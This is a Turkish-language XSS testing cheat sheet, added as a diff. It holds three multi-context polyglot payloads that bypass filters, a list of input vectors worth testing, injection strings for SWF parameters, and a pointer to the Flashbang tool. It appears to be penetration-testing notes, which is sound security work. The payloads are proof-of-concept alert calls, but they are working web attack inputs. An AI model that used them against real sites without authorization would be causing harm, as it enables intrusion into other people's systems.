@@ -1,0 +1,41 @@
+Ana Fikir: Bu sayfa fonksiyonalitesi kullanıcıya bir şey display ediyor mu? 
+ 
+Polyglot’lar:
+ 
+i. Multi-context, filter bypass based polyglot payload 1 (by Rsnake XSS Cheat Sheet)
+	';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> 
+	 
+ii. Multi-context, filter bypass based polyglot payload 2 (by Ashar Javed XSS Research)
+	'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->">>/script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+	 
+iii. Multi-context polyglot payload 3 (by Mathias Karlsson)
+	" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+ 
+Diğer XSS Testleri:
+ 
+Input Vektörleri: 
+	· CSS ile tema & profil özelleştirme
+	· Event ya da meeting oyunları
+	· URI bazlı şeyler
+	· 3rd party’den import edilmiş şeyler (Facebook integrasyonu gibi)
+	· JSON POST değerleri (return eden content type’a bak)
+	· File upload isimleri
+	· Upload edilen dosyalar (swf, HTML, ++) 
+	· Custom hata sayfaları
+	· Fake parametreler - ?realm=1&foo=bar’+alert(/XSS/)+’ 
+	· Login ve Forgot password formları 
+ 
+SWF Parameter XSS:
+ 
+Yaygın Parametreler:
+onload, allowedDomain, mobileplayer, xmlPath, eventhandler, callback, ++ 
+ 
+Yaygın Injection String’leri:
+\%22})))}catch(e){alert(document.domain);}//
+"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
+"a")(({type:"ready"}));}catch(e){alert(1)}//
+ 
+Tool: Flashbang 
+https://github.com/cure53/Flashbang
+ 
+SWF’deki flashVars ‘ı bulur ve display eder. Böylece kodu decompile etmemize gerek kalmadan test etmemize yardımcı olur. 
